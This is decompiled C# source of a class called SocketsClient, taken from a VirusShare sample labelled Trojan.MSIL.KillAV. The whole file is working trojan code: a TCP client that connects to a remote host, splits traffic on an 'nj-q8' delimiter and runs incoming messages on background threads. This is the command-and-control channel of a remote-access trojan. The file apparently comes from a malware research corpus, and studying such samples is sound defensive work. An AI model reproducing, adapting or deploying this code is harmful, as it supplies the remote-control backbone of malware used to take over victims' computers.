// Decompiled with JetBrains decompiler
// Type: n.SocketsClient
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.KillAV.ao-c83dfee0b35be414b2ecb0a3b5fff41c790bb356c2774a2fc681a8981978b48b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using n.My;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace n
{
  public class SocketsClient
  {
    private static string response = string.Empty;
    private static int port;
    private static IPHostEntry ipHostInfo;
    private static IPAddress ipAddress;
    private static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    private byte[] Spl;
    public static Thread TH;

    public SocketsClient() => this.Spl = this.STB("nj-q8");

    public void AT(byte[] D)
    {
      MyProject.MyForms forms = MyProject.Forms;
      Form b = (Form) forms.B;
      n.Delegates.T.T.appendText(ref b, ref D);
      forms.B = (B) b;
    }

    public event SocketsClient.onConnectEventHandler onConnect;

    public event SocketsClient.onErrorEventHandler onError;

    public event SocketsClient.onDataArrivalEventHandler onDataArrival;

    public event SocketsClient.onDisconnectEventHandler onDisconnect;

    public event SocketsClient.onSendCompleteEventHandler onSendComplete;

    public void Connect(string RemoteHostName, int RemotePort)
    {
      try
      {
        SocketsClient.client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        SocketsClient.port = RemotePort;
        SocketsClient.ipHostInfo = Dns.Resolve(RemoteHostName);
        SocketsClient.ipAddress = SocketsClient.ipHostInfo.AddressList[0];
        IPEndPoint remoteEP = new IPEndPoint(SocketsClient.ipAddress, SocketsClient.port);
        SocketsClient.client.BeginConnect((EndPoint) remoteEP, new AsyncCallback(this.sockConnected), (object) SocketsClient.client);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        SocketsClient.onDisconnectEventHandler onDisconnectEvent = this.onDisconnectEvent;
        if (onDisconnectEvent != null)
          onDisconnectEvent();
        ProjectData.ClearProjectError();
      }
    }

    public void SendData(byte[] Data)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        memoryStream.Write(Data, 0, Data.Length);
        memoryStream.Write(this.Spl, 0, this.Spl.Length);
        memoryStream.ToArray();
        SocketsClient.client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
        memoryStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Disconnect()
    {
      try
      {
        SocketsClient.client.Shutdown(SocketShutdown.Both);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        SocketsClient.client.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public byte[] STB(string Data) => Encoding.Default.GetBytes(Data);

    public string BTS(byte[] Data) => Encoding.Default.GetString(Data);

    private void sockConnected(IAsyncResult ar)
    {
      try
      {
        if (!SocketsClient.client.Connected)
        {
          SocketsClient.onDisconnectEventHandler onDisconnectEvent = this.onDisconnectEvent;
          if (onDisconnectEvent == null)
            return;
          onDisconnectEvent();
        }
        else
        {
          SocketsClient.client.ReceiveBufferSize = 99999;
          SocketsClient.client.ReceiveTimeout = -1;
          SocketsClient.client.SendTimeout = -1;
          SocketsClient.onConnectEventHandler onConnectEvent;
          while (true)
          {
            do
            {
              Thread.Sleep(1);
              if (SocketsClient.TH == null)
                SocketsClient.TH = new Thread(new ThreadStart(this.DDD));
              if (SocketsClient.TH.ThreadState == ThreadState.Aborted | SocketsClient.TH.ThreadState == ThreadState.Unstarted | SocketsClient.TH.ThreadState == ThreadState.Stopped)
              {
                SocketsClient.TH = new Thread(new ThreadStart(this.DDD));
                SocketsClient.TH.Start();
                onConnectEvent = this.onConnectEvent;
                if (onConnectEvent == null)
                  goto label_15;
                else
                  goto label_11;
              }
            }
            while (SocketsClient.TH.ThreadState != ThreadState.Running);
            SocketsClient.TH.Abort();
          }
label_15:
          return;
label_11:
          onConnectEvent();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        SocketsClient.onDisconnectEventHandler onDisconnectEvent = this.onDisconnectEvent;
        if (onDisconnectEvent != null)
          onDisconnectEvent();
        ProjectData.ClearProjectError();
      }
    }

    public Array fx(ref byte[] buf)
    {
      Array[] arrayArray = new Array[2];
      MemoryStream memoryStream1 = new MemoryStream();
      string Right = "nj-q8";
      byte[] bytes = new byte[5];
      int num = checked (buf.Length - Right.Length);
      int count = 0;
      Array array;
      while (count <= num)
      {
        bytes[0] = buf[count];
        bytes[1] = buf[checked (count + 1)];
        bytes[2] = buf[checked (count + 2)];
        bytes[3] = buf[checked (count + 3)];
        bytes[4] = buf[checked (count + 4)];
        if (Operators.CompareString(Encoding.Default.GetString(bytes), Right, false) == 0)
        {
          memoryStream1.Dispose();
          MemoryStream memoryStream2 = new MemoryStream();
          MemoryStream memoryStream3 = new MemoryStream();
          memoryStream2.Write(buf, 0, count);
          if (checked (count + 5) != buf.Length)
          {
            memoryStream3.Write(buf, checked (count + 5), checked (buf.Length - count + 5));
            array = (Array) new object[2]
            {
              (object) memoryStream2.ToArray(),
              (object) memoryStream3.ToArray()
            };
            break;
          }
          array = (Array) new object[1]
          {
            (object) memoryStream2.ToArray()
          };
          break;
        }
        checked { ++count; }
      }
      return array;
    }

    public void DDD()
    {
      MemoryStream memoryStream = new MemoryStream();
label_1:
      int num;
      checked { ++num; }
      Thread.Sleep(5);
      try
      {
        if (num > 200)
        {
          try
          {
            if (SocketsClient.client.Poll(-1, SelectMode.SelectRead) & SocketsClient.client.Available <= 0)
            {
              MyProject.Forms.B.Dis();
              return;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            MyProject.Forms.B.Dis();
            ProjectData.ClearProjectError();
            return;
          }
          num = 0;
        }
        if (SocketsClient.client.Available > 0)
        {
          byte[] buffer = new byte[checked (SocketsClient.client.Available - 1 + 1)];
          SocketsClient.client.Receive(buffer, buffer.Length, SocketFlags.None);
          memoryStream.Write(buffer, 0, buffer.Length);
          while (true)
          {
            if (Strings.InStr(this.BTS(memoryStream.ToArray()), "nj-q8") > 0)
            {
              byte[] array = memoryStream.ToArray();
              Array Instance = this.fx(ref array);
              new Thread((ParameterizedThreadStart) (a0 => this.EFE((byte[]) a0))).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object) Instance, new object[1]
              {
                (object) 0
              }, (string[]) null)));
              memoryStream = new MemoryStream();
              if (Instance.Length == 2)
                memoryStream.Write((byte[]) NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 1
                }, (string[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 1
                }, (string[]) null), (System.Type) null, "length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
              else
                goto label_1;
            }
            else
              goto label_1;
          }
        }
        else
          goto label_1;
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          MyProject.Forms.B.Dis();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    public void EFE(byte[] B)
    {
      SocketsClient.onDataArrivalEventHandler dataArrivalEvent = this.onDataArrivalEvent;
      if (dataArrivalEvent == null)
        return;
      dataArrivalEvent(B, checked (B.Length - 1));
    }

    public bool Connected()
    {
      bool flag;
      try
      {
        flag = SocketsClient.client.Connected;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public delegate void onConnectEventHandler();

    public delegate void onErrorEventHandler(string Description);

    public delegate void onDataArrivalEventHandler(byte[] Data, int TotalBytes);

    public delegate void onDisconnectEventHandler();

    public delegate void onSendCompleteEventHandler(int DataSize);
  }
}
